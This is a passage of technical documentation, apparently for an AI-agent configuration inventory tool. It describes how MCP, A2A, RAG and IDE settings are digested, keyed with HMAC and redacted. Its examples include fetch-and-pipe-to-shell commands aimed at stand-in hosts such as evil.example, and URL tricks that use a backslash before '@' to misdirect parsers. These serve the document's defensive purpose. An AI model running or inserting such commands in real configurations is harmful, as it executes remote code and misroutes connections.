# Reconcile a BOM with its MCP, A2A, RAG and IDE configuration

`validate --project` checks a supplied inventory against freshly collected local
evidence. Static MCP server records carry two kinds of source binding.

`static_config_hash` (profile `nexus-symbiote/mcp-static-config/v4`) is an RFC 8785
digest of the server's exported structure: configuration field names, the displayed
command basename, the classified launcher with its wrappers and effective command,
the identity, version and pin of every package it launches, package source origins,
the names of the project resolver settings that apply to it, launch context flags and
counts, transport, endpoint origin, argument count, environment variable and header
names, client settings (auto-approval, disabled, tool filters, with the sorted, redacted
names of the tools that `alwaysAllow`, `autoApprove`, `includeTools`, `excludeTools`,
`enabled_tools`, `disabled_tools` and `disabledTools` list, one list per field because
each client reads only some of them) and declared tool names.
It covers only information the record exports in clear, so it reveals nothing about
secret values. It detects added or removed arguments, environment variables, headers,
fields, resolver settings and tools, a tool swapped into or out of an auto-approval
or tool filter list at the same count or moved between `alwaysAllow` and
`autoApprove`, and changed launchers, package identities and
versions (including dependencies added with `--with`), package source origins, launch
context and endpoint origins.

Package sources are the registry and index options of a launcher (`--registry`,
`--@scope:registry`, `--index-url`, `--find-links` and similar), environment
variables that redirect resolution (`npm_config_registry`, `UV_INDEX_URL`,
`PIP_INDEX_URL`, `UV_PYTHON_INSTALL_MIRROR`, `JSR_URL`, `DOCKER_HOST`, `GOPROXY` and
similar, and cache or tool directories a prepared copy could serve from:
`UV_CACHE_DIR`, `UV_TOOL_DIR`, `PIPX_HOME`, `DENO_DIR`, `GOMODCACHE`), container engine options (`docker -H`, `--context`, `--config`; `podman
--url`, `--root`), `pipx --pip-args` index, trust and constraint options (matched by
unique prefix, as pip's parser does; an unknown option, a requirements file and an
editable install are gaps) and project-root resolver
settings that apply to the launched package: `.npmrc` for npm, pnpm, bun and Deno
`npm:` specifiers, `bunfig.toml` for bun, `.yarnrc.yml` for `yarn dlx`, and `uv.toml`
and `pyproject.toml` `[tool.uv]` (indexes, mirrors, insecure hosts and `sources`
entries for a launched package) for `uv run`. `.npmrc` is read as npm reads it: keys
and values are trimmed, JSON-decoded when quoted and cut at an unescaped `;` or `#`
otherwise, lines end at a carriage return or line feed, keys after the first
`[section]` line are ignored, and a key containing `${...}` is `[unresolved]`. Its
registry (and the `@scope:registry` of a configured `scope` for a package without a
registry of its own, as npm selects it, beside the default registry that pnpm and Bun
use instead for a launcher other than `npx` and `npm exec`; a `scope` that holds
`${...}` may name any scope, so it is an `[unresolved]` source when the file gives
some scope a registry), cache, offline, proxy, `strict-ssl=false`,
CA, user and global configuration, prefix, workspace and store settings are sources;
auth settings (`//host/:...`, `_auth`, `username` and similar) are ignored. For npm and
pnpm, every setting is classified, from `.npmrc` and from `npm_config_*` or
`pnpm_config_*` variables alike: `call` and `package` decide what `npm exec` runs, so
they make the launcher identity unknown (a high `launcher_identity` finding and a gap);
`script-shell`, `node-options`, `shell`, `git`, `node-gyp`, `pnpmfile` and similar load
local code (a medium `launch_context` risk); npm's own configuration keys and common
pnpm keys that change neither are ignored; and any other setting is a source, because
npm passes it to lifecycle scripts, whose installers read binary mirrors from it.
Yarn's `yarnPath` and `plugins` (`.yarnrc.yml`, or `YARN_YARN_PATH` and
`YARN_PLUGINS`) and `yarn-path` (`.yarnrc`) run local code in place of or inside Yarn
and make the identity unknown; proxy, CA, strict-SSL,
cache, checksum, offline, network and environment-file settings of `.yarnrc.yml` are
sources, and a `.env.yarn` file, which Yarn 4 loads by default, is `[unresolved]`.
Sources are exported as `package_sources` entries such as
`.npmrc:@acme:registry=https://npm.acme.example`: the origin only, `[local]` for a
path or other value and `[unresolved]` for a value with `${...}` expansion. A server
that runs in another working directory (a `cwd` other than the root, `env -C`,
`pwsh -WorkingDirectory`, `wsl --cd`, `uv --directory` or `--project`,
`deno --config`) may read other resolver files, so it carries
`working-directory=[unresolved]`, and so does a server declared in a configuration
file below the root (such as `packages/api/.mcp.json`), which its client starts in
that file's directory; one whose variables come from an `envFile` or from
`dotenvx`, `doppler`, `infisical`, `op run --env-file`, `uv --env-file` or
`deno run --env-file` carries
`environment-file=[unresolved]`. A variable that adds a trusted CA or disables TLS
verification (`NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED=0`,
`SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE` and similar) is a source, and so are the
`HTTPS_PROXY`, `HTTP_PROXY` and `ALL_PROXY` variables beside it. A redirected package
keeps its version but loses `launcher_package` and `package_url`, and carries a medium
`package_source` risk. Setting names are exported as `resolver_settings` and digested
only when they come from a fixed vocabulary (npm and pnpm configuration keys, the
Yarn, bun and uv settings above, a scoped registry whose well-formed scope is a
launched package's scope or the configured `scope` npm selects, or the `sources` entry
of a launched package); any other name is `[other]`, once per setting, because a token
pasted on its own `.npmrc` line is read as a setting name. The same rule names a
scoped registry in `package_sources`: `--@scope:registry` becomes `--[other]` and
`npm_config_@scope:registry` becomes `env:npm_config_[other]` for any other scope, and
a label that holds a value the server's scrubber knows, or a token shape, is
`[redacted]`. Values enter only the keyed binding.

For implicit project-root `deno.json` and `deno.jsonc`, the keyed binding retains
each import specifier paired with its target and each scope paired with its
import mappings. Swapping two targets, renaming a specifier or moving a mapping
between scopes changes the binding, even when the multiset of targets is unchanged.
Specifier names stay inside the HMAC; exported source labels do not disclose them.
Object-key ordering and JSONC formatting do not change the binding.

Explicit Deno configuration selection (`--config`, `-c`, or `--no-config`) and
`--import-map` are unsupported coverage gaps, including selectors that name the
usual root configuration file. A referenced `importMap` in a default configuration
and unsupported import/scopes shapes are gaps too. The collector does not claim to
bind selected-file precedence or uncollected resolver dependencies. A binding key
does not resolve those gaps: collection and project reconciliation fail closed.
An inventory with such a gap is not an acceptable baseline, even if a bare diff
between two already-incomplete inventories reports no change.

Values are bound only when the operator sets `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` to
a secret of at least 32 characters during collection and validation. Generate it
from a secure random source, for example with
`python -c "import secrets; print(secrets.token_hex(32))"` or `openssl rand -hex 32`:
every keyed record exports a key identifier derived from the key, so a guessable key
lets anyone holding the BOM test guesses for it offline. Records then also carry
`static_value_binding`, an HMAC-SHA256 under that key over the original server object
and the raw values of every project resolver setting that applies to it, auth
settings excepted (profile `nexus-symbiote/mcp-static-values/v3`), and a key
identifier. This detects a different package with the same version, changed
arguments, environment and header values, endpoint and index paths, opaque launchers
and the directory of a command. The key never enters the BOM; without it, the binding
cannot be used to test guesses for a secret. Keep the key in the CI secret store, use
the same key for a baseline and its candidates, and rotate it by recollecting both. A
keyed BOM validated without the key, or with a different key, fails reconciliation. The
CLI refuses a key shorter than 32 characters before any collector runs (exit 2);
called as a library, the collector records one scan failure per configuration file
that names the variable, and no server of that file is recorded. Every record states
`source_values_bound`.

Without the key, a server whose values go beyond what the inventory exports carries a
low `completeness` risk that names the key and lists what is unbound: a command path
(a command with a directory, or one behind a wrapper), a command the record does not
show as written (`[redacted-command]`, or a name exported in lower case or without its
Windows suffix, so `MCPServer` and `mcpserver`, two files on Linux, share one record),
an endpoint exported as `[redacted]`, launch arguments other than the
recorded launcher package and `-y`, environment values, header values, an endpoint path,
query, fragment or user information, project resolver settings, redacted tool list
entries (when an `alwaysAllow`, `autoApprove`, `includeTools`, `excludeTools`,
`enabled_tools`, `disabled_tools` or `disabledTools` item changes under redaction or
holds a scrubbed credential, which also records a coverage gap without the key so
distinct URLs or secrets cannot collide silently), or the values of the client settings
`cwd` (working directory, except `.`, `./`, `${workspaceFolder}` and
`${workspaceFolder}/` written exactly in a root configuration file, so ` .` is another
directory; nested configuration files mark any `cwd` unbound), `envFile` (environment
file), `watchPaths`, `oauth` and `auth` (authentication settings), `dev` (development
settings) and the Codex `env_vars`,
`bearer_token_env_var` and `env_http_headers` (forwarded environment variable names),
which the record exports only as present. A server whose
arguments are only its recorded launcher package, or with a bare endpoint origin,
carries none. `diff --fail-on-alert` treats an MCP server with that finding as a
medium alert that launch values are unbound, including when the two inventories
were collected from the same bytes: the redacted export cannot show that an
argument or environment value stayed the same. Set the key on both collections to
compare the values. The alert does not record the value.

MCP keyed-value profile v3 replaces v2, which did not retain Deno import-name-to-target
associations. Old v2 keyed records fail reconciliation and require recollection and
review; do not copy or relabel their old binding. This keyed-value version is separate
from the exported-structure profile, now `mcp-static-config/v4`.

Static configuration profile v1 records (an unkeyed digest over raw configuration, including secret
values) let anyone holding the BOM confirm guesses for low-entropy secrets. They
fail reconciliation as unknown and require recollection; treat existing v1 exports
as sensitive and replace them. Static configuration profile v2 records (0.1.0) were digested before
launchers, package sources and launch context were classified; `validate --project`
reports them as unknown and asks for recollection, like v1. Neither binding
authenticates a publisher, identifies the installed executable or establishes that a
tool backend is benign. JSON object-key ordering and whitespace do not change either
binding.

Configured tool entries retain their configuration source path and static
collection mode. Validation compares their descriptor digest, fingerprint
version and server reference with a fresh collection. Recomputing the digest of
an edited supplied descriptor establishes only self-consistency and cannot make
it match a different local declaration, so integrity counts a tool descriptor as
verified only when it matches the tool collected from the project's MCP
configuration; a descriptor that agrees only with its own recorded digest is
reported as unknown. An asserted live-observation claim does not substitute for
the static configuration evidence.

## A2A agent cards and client entries

A2A records export URLs only as origins (scheme, host and port): the path, query,
fragment and user information of a card's `url`, of its A2A 1.0
`supportedInterfaces` and A2A 0.3 `additionalInterfaces` URLs, of security scheme
URLs such as `tokenUrl` and `openIdConnectUrl`, and of a client's `agentCardUrl`
never enter the BOM. A URL without a scheme keeps its host and port in the form
`//host:port`: the network-path reference `//auth.example.com/token` is exported as
`//auth.example.com`, and the A2A 1.0 gRPC address `grpc.example.com:443` as
`//grpc.example.com:443`. A URL whose origin cannot be exported is exported as
`[redacted]` and counts as unbound: one without a host or with an invalid port, a
bare `host:port` or `host/path` whose host is not a dotted name, `localhost` or a
bracketed IP, or one whose host, as Python's parser reads it, contains a character
other than letters, digits, `.`, `-`, `_` or `:`, such as `https://host\path`
(WHATWG parsers read a path after the backslash). A backslash before an `@` is not
caught: `https://evil.example\@good.example/` is exported as `https://good.example`
while WHATWG parsers connect to `evil.example`, and the change raises only the
high structure-digest alert for user information (`properties.static_card_hash
changed`).

The scanner reads A2A 0.3 cards and A2A 1.0 cards. For 1.0 it follows the
`lf.a2a.v1` messages in `specification/a2a.proto` of the A2A repository and, as
proto3 JSON parsers do, reads `supportedInterfaces`, `securitySchemes`,
`securityRequirements`, the skills' `securityRequirements` and the security scheme
members under their JSON or proto names, such as `supportedInterfaces` or
`supported_interfaces`. A card that gives both names for one of these is a scan
failure; other 1.0 fields are not read. `supportedInterfaces` lists the
interfaces with the preferred one first. When the card has no top-level `url`, the
first entry becomes the record's `endpoint_url`. The card's `url` and its first
supported interface must both use HTTPS, or the card carries a high
`transport_security` risk. A scheme-less URL, including a gRPC `host:port`
address, fails that check because it does not show TLS.

Several security declarations are recorded in clear:

- `capabilities.oauth_scopes` holds the scopes that the requirements of the card
  and of its skills name for `oauth2` and `openIdConnect` schemes. Requirements
  come from the 0.3 `security` lists of the card and of each skill, and from the 1.0
  `securityRequirements` lists of the card and of each skill, whose entries take the
  form `{"schemes": {"<scheme>": {"list": ["<scope>"]}}}`. Scopes are public
  identifiers (RFC 6749 section 3.3), so scope URIs such as
  `https://www.googleapis.com/auth/drive.readonly` or `api://<app>/access_as_user`
  are kept in full. A scope in `scheme://` URL form with user information, a query or a
  fragment is reduced to its origin, a recognised credential assignment such as
  `token=...` or `api_key=...` is reduced by the standard redaction, and one in a
  known token format (a JWT or a prefix the [security model](security-model.md#known-false-positive-and-false-negative-classes)
  lists, such as `ghp_`, `AKIA`, `sk-`, `xox`, `glpat-`, `AIza` or `gsk_`) is
  exported as `***`; a scheme-less scope that contains `?`, `#` or
  `@`, such as `a?b=1`, is exported in full. A change to the set of scopes raises a high
  `capabilities changed` alert. A scope moved between the card and a skill, or
  between skills, changes only the structure digest below and raises a high
  `properties.static_card_hash changed` alert.
- `properties.security_scheme_types` lists the declared scheme types, mapped onto
  `apiKey`, `http`, `oauth2`, `openIdConnect`, `mutualTLS` or `other`. A 0.3
  `type` is matched without regard to case, so `OAuth2` counts as `oauth2`. A 1.0
  scheme names its type by its single member: `apiKeySecurityScheme`,
  `httpAuthSecurityScheme`, `oauth2SecurityScheme`, `openIdConnectSecurityScheme`
  or `mtlsSecurityScheme`. A scheme with two members, or whose `type` contradicts
  its member, is a scan failure.
- `properties.security_scheme_origins`, `properties.additional_interface_origins`
  and `properties.supported_interface_origins` list the origins of the URL fields in
  `securitySchemes` (any field whose name ends in `url` or `uri`, outside scope
  maps), of `additionalInterfaces`, and of `supportedInterfaces` in their declared
  order. Without a key, moving a token endpoint or interface to a host the card did not
  already use for such a URL, or putting first a supported interface with a
  different origin, raises a medium alert that names the changed origins property,
  such as `properties.security_scheme_origins changed`; a different path depth
  changes the structure digest below and raises a high
  `properties.static_card_hash changed` alert. Reordering supported interfaces
  that share an origin and path depth is detected only with the key. Moving the endpoint, including the first supported interface
  of a card without `url`, raises a high `endpoint_url changed` alert.

Requirement values of schemes that are not declared as `oauth2` or
`openIdConnect` (`apiKey`, `http`, `mutualTLS`, `other`, or a scheme the card does
not declare) may be role names or anything else, even a pasted credential, so they
are not exported. The structure digest below covers them instead, so a change such
as `read:only` to `admin` raises a high `properties.static_card_hash changed` alert
without a key, in a skill's requirements as in the card's.

Distinct security-scheme names must remain distinct after secret redaction. If
two names redact identically anywhere in a card's declarations or card/skill
requirements, collection fails with an explicit coverage gap, including when the
binding key is set. This prevents loss of the scheme-to-requirement association
without publishing a guessable hash of the original names. Use distinct,
non-secret scheme identifiers, then recollect and review the card.

`authentication_required` is true only when the card declares at least one of
`security`, `securityRequirements` or a legacy `authentication` object, and each
one it declares passes: every alternative in `security` and `securityRequirements`
is non-empty and names only declared schemes that state a type the collector
recognises (a type such as `none` maps to `other` and does not count), and a legacy
`authentication` object lists at least one scheme name other than `none`, `noauth`,
`no-auth`, `anonymous`, `public` or `unauthenticated`, in any case. The legacy object counts only for a
card without `securitySchemes`, `securityRequirements` or `supportedInterfaces`,
because clients of the 0.3 and 1.0 declarations do not read it. An empty alternative (`{}` or `{"schemes": {}}`) permits
anonymous access, and an empty list declares no requirement. The specifications do
not say how a skill's requirements combine with the card's, so skill requirements
can make `authentication_required` false but never true. A skill alternative that
is empty or names an undeclared or untyped scheme makes it false, with a medium
`authentication` finding that a skill has no non-empty requirement. Requirements
declared only on skills leave a card without requirements of its own at false. An
empty skill list adds no requirement, because proto3 JSON does not distinguish it
from an absent field. A `null` `securitySchemes`, `security`,
`securityRequirements`, `authentication` or `authentication.schemes` counts as
absent, and so does a skill's `null` `security` or `securityRequirements`. These are
declarations: they do not show that an endpoint enforces authentication.

Every A2A server record, and every client record read from an A2A configuration
file, carries `static_card_hash` (profile `nexus-symbiote/a2a-card-structure/v4`)
or `static_config_hash` (profile `nexus-symbiote/a2a-client-structure/v1`); the
`a2a-server:code-detected` or `a2a-client:code-detected` record created from SDK
use in Python source carries neither digest nor `source_values_bound`. These RFC
8785 digests cover the top-level field names of the card or client entry, for a
card its signatures (the `alg` and `kid` of each protected header), boolean
capability flags, extensions (URL shape and `required` flag) and the shape of its
provider URL, security scheme names with their mapped types, each
requirement alternative of the card and of each skill (keyed by the skill's exported
name) with its exported scopes and the values of other scheme types, the number of
legacy scheme names that declare authentication, and the shape of each URL: the number of path
separators, whether a query, fragment or user information is present, and the path
itself only when it is a public root path (`/` or, for clients,
`/.well-known/agent.json` or `/.well-known/agent-card.json`). They hold no other
path, query or tenant value, so a same-origin path change that keeps the number of
path separators, and does not move to or from a root path, leaves them unchanged. They are unkeyed, so anyone holding the BOM can test guesses against
them. They reveal field and scheme names, path depth and whether user information or
a query is present, and they let a BOM holder confirm a guess of the requirement
values of schemes other than `oauth2` and `openIdConnect`.

With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY` set, records also carry
`static_value_binding`, an HMAC-SHA256 under that key over the whole card (profile
`nexus-symbiote/a2a-card-values/v1`) or client entry (profile
`nexus-symbiote/a2a-client-values/v1`), and the key identifier that MCP records use
for the same key. A changed path, query, token URL, interface tenant or any other
value then changes a compared property, and `diff --fail-on-alert` reports a high
`properties.static_value_binding changed` alert. Each record states `source_values_bound`, so a keyed
baseline validated without its key, or with a different key, fails reconciliation.
The binding needs RFC 8785 JSON values: under the key, a client entry with a value
such as an unquoted YAML date is a scan failure that names the key.

Without the key, a changed path, query, tenant or other unexported value changes
the record only when it changes an exported origin, a URL's shape, a top-level field
name or the record's completeness risk. A card carries a low `completeness`
risk naming the key and listing what is unbound when its endpoint, a supported or
additional interface URL, or a security scheme URL goes beyond its exported origin
or has none, when a supported interface sets a `tenant`, or when a scope of the card
or of a skill was redacted. A client carries it when its `agentCardUrl` goes beyond
its exported origin and is not one of the root paths above. Both say the values are
not bound in this inventory, so `diff` raises a medium alert that the record's values
are unbound on every comparison, changed or not, and names no value: a same-depth
path change on the same host, or a changed tenant value, fails a keyless
`diff --fail-on-alert` on that alert rather than on the change. Other values are bound
only by the key, and the risk does not list them; on a record without the risk, a
change to one of them passes a keyless `diff --fail-on-alert`: descriptions; the id of a skill
that has a name, and skill descriptions, tags, examples and input or output modes;
security scheme fields other than their types and URLs, such as an API key's `name`
and location, an HTTP scheme's `scheme` and `bearerFormat`, an authorization code
flow's `pkceRequired` and the scope descriptions of a flow; interface transports;
`protocolBinding`; and `protocolVersion`. `tests/test_a2a_binding.py` holds the test
vectors for the four profiles, with a second card vector in the A2A 1.0 form. Both
card vectors include a skill with its own requirements.

Cards are read from any `.well-known` directory, such as
`public/.well-known/agent-card.json`, and from `agent.json`, `agent-card.json` and
`a2a/agent.json` in the project root when they carry an A2A field. The same card
published under both well-known names is one record whose
`properties.agent_card_paths` lists both; two different cards with one name are a
scan failure, and a card without a name is identified by its path. Server records
also carry `card_signatures` (count, `alg` and `kid`; `card_signature_verified` is
`not-checked`), `capability_flags`, the origins and `required` flags of
`extensions`, and `provider_origin`, so removing a signature, enabling push
notifications or adding a required extension raises an alert without the key: it
changes the structure digest too, so the alert is high and names
`properties.static_card_hash` beside the changed property.

## RAG sources

Each RAG source record carries `static_config_hash` (profile
`nexus-symbiote/rag-source-structure/v2`), an RFC 8785 digest of the source's field
names, its exported name, type, store type, embedding model, chunking and index
identities, the exported form and URL shape of each `source_uris` entry, the presence
and count of its inline `documents`, the state of its `sanitization` and `content_filter`
controls (`enabled` only for `true` or an object whose `enabled` is `true`;
`disabled`, `absent` or `unrecognized` otherwise), and a description of every other
value: of other fields such as `vector_store`, of the members of `embeddings` other
than `model`, of a control other than a boolean or a boolean `enabled` member, and,
beside a `sources` or `knowledge_bases` list, of the fields that every source of the
file shares. The description keeps names, booleans and nulls, and each URL as its
exported origin and shape; other text and numbers enter it only as their type.
Values under a `documents` field in these other fields are treated as inline content:
only their presence, count or type is recorded, and URLs inside them are not treated
as endpoints. URL origins elsewhere are exported as `endpoint_origins` and
`configuration_endpoint_origins` and checked for encrypted transport like
`source_uris`; a finding about the shared
fields is recorded once, on the file's first source. A file that declares more than
1,000 such URLs and `source_uris` entries together is a collection failure, since
each may become a finding. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
set, `static_value_binding` is an HMAC-SHA256 (profile
`nexus-symbiote/rag-source-values/v1`) over the source object and an HMAC of the
shared fields. Without the key, a source whose URIs go beyond their exported origins,
or whose nonempty inline document contents or other values the record exports only as
redaction markers or not at all, carries a
low `completeness` risk naming the key, and so does the first source for shared
values. URLs are exported as origins; connection strings, `user:secret@host` forms
and token-shaped values as redaction markers; inline documents only as
`document_count`. With the same binding key, a content change raises a drift alert;
without it, a same-count content change cannot be detected. A file whose source list is
empty but which declares other fields is read as one source.

The previous v1 structure profile and `inline_documents_hash` used unkeyed digests
of inline content, so holders of those inventories can confirm guesses of low-entropy
documents. Treat earlier inventories and exports as sensitive. Under v2, every RAG
source's `static_config_hash` changes once, not only sources with inline documents:
the profile name is part of the digested structure, and an absent `documents` key is
digested as `{"present": false}` where v1 digested `null`. On an unchanged project,
`diff` between a v1 baseline and a v2 collection therefore raises a high
`properties.static_config_hash changed` alert for every RAG source, and
`validate --project` on a v1 inventory that records a RAG source fails
reconciliation, reporting the source as a missing or mismatched local component,
until it is recollected. Recollect both the reviewed baseline and candidate with
v2, using the same binding key when content drift must be detected, and review the
migration before adopting the new baseline. `tests/fixtures/rag-source-structure-v1.json`
is a v1 capture of one source, and `tests/fixtures/rag-source-structure-v2.json` the
v2 known-answer vector for the same source: its digested structure and the
`static_config_hash` it must produce. Recollection does not revoke copies of
earlier inventories.

## IDE agent settings

Each IDE agent record carries `settings_hashes`, an RFC 8785 digest of each settings
file it recognizes, keyed by its project-relative path: for `claude-code`,
`.claude/settings.json` and `.claude/settings.local.json` (or a subdirectory's copies
for a nested record) and a plugin repository's `.claude-plugin/plugin.json`,
`.claude-plugin/marketplace.json` and `hooks/hooks.json`; for `cursor`,
`.cursor/settings.json`, `.cursor/cli.json` and `.cursor/hooks.json`; for `codex`,
`.codex/config.json` and `.codex/config.toml`; for `gemini`, `.gemini/settings.json`;
for `antigravity`, `.antigravity/config.json` and `.antigravity/settings.json`; for
`xai`, `.xai/config.json` and `.xai/settings.json`; for `copilot`,
`.github/copilot-extensions.json`; and `.windsurf/settings.json` and
`.cline/settings.json`. `.gemini/settings.json`, `.cursor/hooks.json`,
`.cursor/cli.json` and the Antigravity, xAI and Copilot files are read as JSON with
comments and trailing commas, as editors read settings; the others as JSON.
`.codex/config.toml` is digested whole, every table included, as the JSON value of
its TOML. A recognized file that cannot be read or parsed is a failure. So is a file
whose digest or keyed binding has no RFC 8785 form, such as TOML with a date: the
failure names it, and the record then carries no keyed binding.

Every digest in `settings_hashes` covers the file after the standard
[redaction](security-model.md#known-false-positive-and-false-negative-classes), with
or without the key, and the record names that form in `settings_hashes_profile`,
`nexus-symbiote/ide-settings-redacted/v1`. It keeps `env` names but not their values,
and the keys of the Claude Code credential helpers `apiKeyHelper`, `awsAuthRefresh`,
`awsCredentialExport`, `gcpAuthRefresh` and `otelHeadersHelper`, wherever a settings file names one, but
not their commands: each becomes `***` whatever it is, since a helper command such as
`printf passphrase` can hold a credential the redaction does not recognise. No helper
is run. For the same reason a command, its arguments and the value of an HTTP header
keep only their shape: the value of every key named `command`, ending in `Command`
(such as Gemini CLI's `toolDiscoveryCommand`), `args` or `notify`, such as a hook
command, a `statusLine` command or an MCP server's arguments, keeps the URL origins it
names, the unquoted shell operators and the program word of each command, and no other
word, so `check.sh --password 482913` is digested as `check.sh`. A program word is the
first word of the value or the first after an unquoted `;`, `&`, `|`, line break, `(`,
`$(` or opening backtick, after any `NAME=value` assignments and file descriptor
numbers, and is kept only when it expands nothing but a variable name, as in
`"$CLAUDE_PROJECT_DIR"/hooks/check.sh`. A wrapper such as `sudo`, `env` or `xargs` is
the program word, and the words it runs are not kept. No word starts a command inside
quotes, a comment, a redirection target, arithmetic, an array assignment or a
`[[ ... ]]` test, or after a backslash before a line break, so
`mysql -uroot \` followed by `-p482913 app_db` on the next line is digested as `mysql`.
After `case`, whose patterns follow command separators, no word is kept, and a here
document or here-string operator (`<<`, `<<-` or `<<<`) and everything after it become
the operator and `***`, so `sudo -S apt-get update <<EOF`, a line `482913` and `EOF`
are digested as `sudo<<***`. An argument list keeps only URL origins, and each value under
`headers`, `httpHeaders`, `http_headers` or `env_http_headers`, such as `X-Pin: 482913`,
in a map or in a list, becomes `***` while its header name stays. A `headersHelper`
counts as a command. A permission rule in a Claude Code or Cursor `permissions.allow`,
`ask` or `deny` list, or a Gemini CLI `excludeTools`, `coreTools`, `allowedTools` or
`tools.exclude`, `tools.core` or `tools.allowed` list, and a hook `matcher` keep their
tool name and the shape of their specifier, so `Bash(mysql -uroot -p482913 db:*)` is
digested as `Bash(mysql)` and `Read(./src/**)` stays as it is. A Codex
`shell_environment_policy.set` map and a `query_params` map keep their names only, as
`env` does, and a Codex `experimental_bearer_token` or an OAuth `clientSecret` becomes
`***`. A URL keeps only its scheme, host and
port, and a credential in an assignment, after an authorization scheme or in a known
token format is removed. The redaction is applied separately to the text between
the shell operators `;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `{`, `}`, `<`, `>` and line breaks,
which are kept, so a URL or an assigned value ends at the first of them: a command,
an operator or a host written after one without white space, such as
`https://cdn.example/a.sh;curl${IFS}https://evil.example|sh` or `pwd=$(id)`, stays
covered. In a command, an operator inside quotes, and `$`, `{` and `}` other than in
`$(`, do not split the text, and a URL there keeps only its origin. Each URL scheme in such a text also starts a new part, so every URL keeps
its own host whatever separates it from the text before it, such as the second host
in `--webhooks=https://hooks.example/n,https://evil.example/x` or the host assigned to
a credential-named option such as `--token-url=https://auth.example/t`;
other text glued to a URL without an operator or another scheme remains part of that
URL's redacted path. A redacted value that itself contains one of these characters,
or a scheme followed by `://`, such as a URL query parameter after `&` or a
`?to=https://other.example` redirect target, is covered from that character or
scheme on. Without the key, a
file holding a URL whose authority URL parsers read differently (a backslash in it, such as
`https://attacker.example\@corp.example`, which urlsplit reads as `corp.example` and
WHATWG parsers such as Codex's as `attacker.example`, or an `http`, `https`, `ws`,
`wss` or `ftp` URL with an empty authority) is a failure that names the file, gets no
digest and fails the scan gate, as the `mcp` collector refuses such an endpoint; with
the key, the keyed binding covers its host. Keys
are redacted the same way. When distinct keys redact identically, the digest
retains all projected values in canonical order rather than dropping earlier entries.
Anyone holding
the BOM therefore cannot confirm a guess of a value the
redaction removes, such as the environment value of an MCP server that
`.codex/config.toml` declares, which the `mcp` record withholds too, or a
credential helper command. The cost is that
without the key a change to such a value alone, such as a new helper command, or a
new token or URL path on the same host in a `notify` command such as
`TOKEN=x curl https://cdn.example/a.sh | sh`, leaves the record unchanged; the record
then carries a low `completeness` finding that names the key, and `diff` raises a
medium alert that its values are unbound on every comparison, changed or not, so a
keyless `diff --fail-on-alert` fails. Reordered keys and
whitespace change no digest. With the key, `static_value_binding` is an HMAC-SHA256
under the key over every file as read
(profile `nexus-symbiote/ide-settings-values/v1`), so the record still changes with
any value while no unkeyed digest covers environment values or text the redaction
removes. A value the redaction leaves in place outside a command, an argument list,
a header, a permission rule or the maps and keys named above, such as a password
stored under another key name or a `cwd` path, can still be confirmed from the
digest, so keep credentials out of settings files. Without the key, a change only to a
command's arguments, such as a new pinned version in an MCP server's `args`, a new
option of a hook or `Bash(npm test)` becoming `Bash(npm publish)`, alters no digest, so
`diff` cannot name it; the record instead raises the medium unbound-values alert on
every comparison, so a keyless `--fail-on-alert` fails. A new program, host, operator,
hook, rule, tool or header name still changes a recorded digest, so
`diff` reports the change. The digests agree between a keyed and an unkeyed
collection, except that without the key a file holding an ambiguous URL authority is
a failure instead of a digest, so enabling the key later changes no recorded digest;
the binding itself appears only with the key. A record from an earlier build has no
`settings_hashes_profile`, so `diff` reports the profile as added, a medium alert
that fails `--fail-on-alert`, and project validation does not reconcile the record.
Its digest of a file the redaction leaves as it is matches this build's, but earlier
builds digested most files as read without the key and kept every credential helper
command with it, so the digest of a file with an `env` map, a helper or another
redacted value can also differ, a high alert. Record the baseline again.

The `claude-code` record also counts what the files declare: hook handlers per event
(`declared_hooks`), allow, ask and deny rules (`declared_permission_rule_counts`),
and, in `settings_declarations`, additional directories, plugins, marketplaces,
environment variables and MCP server approvals. The `cursor` record counts the
commands of `.cursor/hooks.json` in `properties.hook_commands`.

## Imported instruction files

A memory file's `@path` import keeps the unkeyed `content_hash` that every instruction
file carries only when the path imported, and the file a symlink there leads to, if
any, both have a Markdown suffix (`.md`, `.mdc` or `.markdown`). Any other import is
inventoried without `content_hash`, and `properties.content_hash_withheld` says why:
its exact bytes may hold configuration or secrets, which an unkeyed digest would let
anyone holding the BOM confirm by guessing. With `NEXUS_SYMBIOTE_SOURCE_BINDING_KEY`
set, `static_value_binding` is an HMAC-SHA256 under the key over the path imported and
the file's text (profile `nexus-symbiote/prompt-import-content/v1`); without the key
the record carries a low `completeness` finding that names it. An import is a gap and
is not read when the path imported, or the file a symlink there leads to, is
[named as holding credentials](#files-named-as-holding-credentials).

Every other instruction, rule, prompt or subagent file the `prompt` collector records
follows the same rule, under the same profile, with its own path in the binding: an instruction, nested memory, rule, prompt
or subagent file keeps `content_hash` only when its name has a Markdown suffix, is an
instruction file name without one (`.cursorrules`, `.clinerules`, `.windsurfrules`,
`system_prompt.txt`), or, in a rule, prompt or subagent directory, has no suffix at
all, and when the file a symlink there leads to, if any, has a Markdown suffix, the
same test an import of that file passes. `AGENTS.md` linked to `config/app.json` or
`config/.windsurfrules` is recorded as `prompt:AGENTS.md` without `content_hash`, as is
`.cursor/rules/x.json`; an ordinary
`CLAUDE.md`, `AGENTS.md` linked to `docs/agents.md` and `.cursor/rules/x.mdc` keep it,
and so does a rule file without a suffix that a directory symlink leads the walk to,
such as `shared/r/style` behind `.cursor/rules` linked to `shared/r`, whose record
names the directory in `properties.instruction_directory`. The files of a skill or
command directory are skill resources: each keeps its unkeyed `sha256` digest whatever
its name, also when it is a symlink to a file an import inventories without
`content_hash`, so keep configuration out of skill directories.

`validate --project` with the key recomputes the binding from the file and counts it
as a verified hash, and a changed file as a failed one. A binding under another
profile or key cannot be checked and is unknown evidence. Without the key, or for an
inventory collected without one, nothing binds the content: the integrity check counts
the record in `hashes_unbound` and lists it as an `info` issue, the completeness check
does not report a missing hash, and a change to the file passes validation. Project
reconciliation compares each record with a fresh collection, so validate with the key
the inventory was collected with, or without one if it was collected without one.

## Files named as holding credentials

The `prompt` collector does not read a file without a Markdown suffix whose name, or a
directory on whose path, says it holds credentials, as the
[known limitations](known-limitations.md#instructions-and-ide-settings) list them, such
as `.env`, `config/secrets.json` or `secrets/token.txt`, so no `content_hash`, skill
digest or keyed binding covers it. Such a file is a coverage gap when a memory file
imports it; when an instruction file such as `CLAUDE.md`, a rule, prompt or subagent
